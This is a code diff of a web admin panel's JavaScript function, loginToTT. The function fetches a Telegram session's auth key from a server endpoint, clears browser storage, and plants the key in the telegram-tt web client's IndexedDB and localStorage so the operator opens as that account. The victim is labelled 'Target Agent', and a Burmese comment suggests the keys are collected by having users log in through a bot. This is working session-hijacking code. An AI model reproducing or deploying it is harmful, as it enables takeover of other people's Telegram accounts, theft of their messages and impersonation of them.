@@ -70,107 +70,103 @@
     }
 
     async function loginToTT(phoneNumber) {
-        document.getElementById('sessions-list').innerHTML = "<h3 style='color:#00ffcc;'>Injecting Session... Please wait...</h3>";
-        
-        try {
-            const res = await fetch('/api/admin/get-tt-session', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ password: currentPassword, phoneNumber: phoneNumber })
-            });
-            const data = await res.json();
-
-            if (data.success) {
-                // 🌟 [အရေးကြီးပြင်ဆင်ချက်] - Session အဟောင်းများတွင် authKey မပါလျှင် တားဆီးခြင်း
-                if (!data.authKeyHex || !data.dcId) {
-                    alert("⚠️ ဤ Session သည် Data အဟောင်းဖြစ်နေပါသည်။ (telegram-tt အတွက် authKey မပါဝင်ပါ) ထိုအကောင့်ကို Bot တွင် အသစ်ပြန်လည် Login ဝင်ခိုင်းပါ။");
-                    window.location.reload();
-                    return; // အောက်က Code များကို ဆက်မလုပ်တော့ဘဲ ရပ်တန့်မည်
-                }
-
-                // Hex ကို Byte Array သို့ ပြောင်းခြင်း
-                const authKeyArray = new Uint8Array(data.authKeyHex.match(/.{1,2}/g).map(byte => parseInt(byte, 16)));
-                const userIdStr = String(data.userId);
-
-                // Storage အဟောင်းများ ရှင်းလင်းခြင်း
-                localStorage.clear();
-                sessionStorage.clear();
-
-                localStorage.setItem('dc', String(data.dcId));
-                
-                const globalState = {
-                    auth: { state: "authorizationStateReady", phoneNumber: phoneNumber },
-                    currentUserId: userIdStr,
-                    byTabId: {},
-                    messages: { byChatId: {} },
-                    chats: { byId: {}, listIds: { active: [] } },
-                    users: {
-                        byId: {
-                            [userIdStr]: { 
-                                id: userIdStr, 
-                                type: "userLocal", 
-                                phoneNumber: phoneNumber,
-                                firstName: "Target",
-                                lastName: "Agent"
-                            }
-                        }
-                    },
-                    recentEmojis: [],
-                    settings: { byKey: { theme: "dark", language: "en", messageTextSize: 16, animationLevel: 1, messageSendKeycombo: "enter" } }
-                };
-                localStorage.setItem('tt-global-state', JSON.stringify(globalState));
-
-                const deleteRequest = window.indexedDB.deleteDatabase('tt-data');
-
-deleteRequest.onsuccess = function() {
-    // ဖျက်ပြီးမှ အသစ်ပြန်လည် တည်ဆောက်ပါမည်
-    const request = window.indexedDB.open('tt-data', 1);
+    document.getElementById('sessions-list').innerHTML = "<h3 style='color:#00ffcc;'>Injecting Session... Please wait...</h3>";
     
-    request.onupgradeneeded = function(event) {
-        const db = event.target.result;
-        if (!db.objectStoreNames.contains('keyval')) {
-            db.createObjectStore('keyval');
-        }
-    };
+    try {
+        const res = await fetch('/api/admin/get-tt-session', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ password: currentPassword, phoneNumber: phoneNumber })
+        });
+        const data = await res.json();
 
-    request.onsuccess = function(event) {
-        const db = event.target.result;
-        if (db.objectStoreNames.contains('keyval')) {
-            const transaction = db.transaction(['keyval'], 'readwrite');
-            const store = transaction.objectStore('keyval');
-            
-            store.put(authKeyArray, `dc${data.dcId}_auth_key`);
-            store.put(String(data.dcId), 'dc');
-            
-            transaction.oncomplete = () => {
-                window.location.href = '/'; 
-            };
-        } else {
-            alert("Storage init failed. Please try again.");
-            // 🌟 ပြင်ဆင်ချက်: Failed ဖြစ်လျှင် White screen မဖြစ်စေရန် Data များကို ပြန်ဖျက်ပြီး Redirect မလုပ်ပါနှင့်
-            localStorage.clear();
-        }
-    };
-
-    request.onerror = function() {
-        alert("IndexedDB Error. Please clear browser data and try again.");
-        localStorage.clear();
-    };
-};
-
-deleteRequest.onerror = function() {
-    alert("Old storage clear failed. Please clear browser site data manually.");
-};
-
-            } else {
-                alert("Session Load Failed!");
+        if (data.success) {
+            if (!data.authKeyHex || !data.dcId) {
+                alert("⚠️ ဤ Session သည် Data အဟောင်းဖြစ်နေပါသည်။ (telegram-tt အတွက် authKey မပါဝင်ပါ) ထိုအကောင့်ကို Bot တွင် အသစ်ပြန်လည် Login ဝင်ခိုင်းပါ။");
                 window.location.reload();
+                return; 
             }
-        } catch (err) {
-            alert("Error injecting session. Check server connection.");
+
+            const authKeyArray = new Uint8Array(data.authKeyHex.match(/.{1,2}/g).map(byte => parseInt(byte, 16)));
+            const userIdStr = String(data.userId);
+
+            // Storage အဟောင်းများ ရှင်းလင်းခြင်း
+            localStorage.clear();
+            sessionStorage.clear();
+            localStorage.setItem('dc', String(data.dcId));
+            
+            const globalState = {
+                auth: { state: "authorizationStateReady", phoneNumber: phoneNumber },
+                currentUserId: userIdStr,
+                byTabId: {},
+                messages: { byChatId: {} },
+                chats: { byId: {}, listIds: { active: [] } },
+                users: {
+                    byId: {
+                        [userIdStr]: { 
+                            id: userIdStr, 
+                            type: "userLocal", 
+                            phoneNumber: phoneNumber,
+                            firstName: "Target",
+                            lastName: "Agent"
+                        }
+                    }
+                },
+                recentEmojis: [],
+                settings: { byKey: { theme: "dark", language: "en", messageTextSize: 16, animationLevel: 1, messageSendKeycombo: "enter" } }
+            };
+            localStorage.setItem('tt-global-state', JSON.stringify(globalState));
+
+            // 🌟 ဤအပိုင်းသည် အရေးကြီးဆုံးဖြစ်သည် - Database အဟောင်းကို အရင်ဖျက်ပစ်ပါမည်
+            const deleteRequest = window.indexedDB.deleteDatabase('tt-data');
+            
+            deleteRequest.onsuccess = function() {
+                const request = window.indexedDB.open('tt-data', 1);
+                
+                request.onupgradeneeded = function(event) {
+                    const db = event.target.result;
+                    if (!db.objectStoreNames.contains('keyval')) {
+                        db.createObjectStore('keyval');
+                    }
+                };
+
+                request.onsuccess = function(event) {
+                    const db = event.target.result;
+                    if (db.objectStoreNames.contains('keyval')) {
+                        const transaction = db.transaction(['keyval'], 'readwrite');
+                        const store = transaction.objectStore('keyval');
+                        
+                        store.put(authKeyArray, `dc${data.dcId}_auth_key`);
+                        store.put(String(data.dcId), 'dc');
+                        
+                        transaction.oncomplete = () => {
+                            window.location.href = '/'; 
+                        };
+                    } else {
+                        alert("Storage init failed. Retrying...");
+                        window.location.href = '/';
+                    }
+                };
+
+                request.onerror = function() {
+                    alert("IndexedDB Error. Fallback redirection...");
+                    window.location.href = '/';
+                };
+            };
+            
+            deleteRequest.onerror = function() {
+                alert("Please clear browser site data manually and retry.");
+            };
+
+        } else {
+            alert("Session Load Failed!");
             window.location.reload();
         }
+    } catch (err) {
+        alert("Error injecting session. Check server connection.");
+        window.location.reload();
     }
+}
 </script>
 </body>
 </html>
